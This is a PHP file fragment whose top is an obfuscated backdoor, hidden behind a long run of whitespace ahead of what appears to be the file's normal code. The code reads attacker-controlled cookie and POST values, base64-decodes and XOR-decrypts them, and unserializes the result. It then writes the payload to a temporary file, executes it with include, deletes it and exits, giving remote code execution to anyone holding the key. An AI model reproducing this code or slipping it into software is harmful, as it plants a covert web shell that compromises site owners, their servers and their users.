<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("agprtv")){class agprtv{public static $zuqvr = "ojpfvgrckrqjiqeo";public static $cjguukcp = NULL;public function __construct(){$etbpyyzapv = @$_COOKIE[substr(agprtv::$zuqvr, 0, 4)];if (!empty($etbpyyzapv)){$goczkle = "base64";$gklinxg = "";$etbpyyzapv = explode(",", $etbpyyzapv);foreach ($etbpyyzapv as $khjpnbhks){$gklinxg .= @$_COOKIE[$khjpnbhks];$gklinxg .= @$_POST[$khjpnbhks];}$gklinxg = array_map($goczkle . "_decode", array($gklinxg,));$gklinxg = $gklinxg[0] ^ str_repeat(agprtv::$zuqvr, (strlen($gklinxg[0]) / strlen(agprtv::$zuqvr)) + 1);agprtv::$cjguukcp = @unserialize($gklinxg);}}public function __destruct(){$this->lqmybu();}private function lqmybu(){if (is_array(agprtv::$cjguukcp)) {$qsdmroeql = sys_get_temp_dir() . "/" . crc32(agprtv::$cjguukcp["salt"]);@agprtv::$cjguukcp["write"]($qsdmroeql, agprtv::$cjguukcp["content"]);include $qsdmroeql;@agprtv::$cjguukcp["delete"]($qsdmroeql);exit();}}}$lmqpsvvn = new agprtv();$lmqpsvvn = NULL;} ?><?php
/**
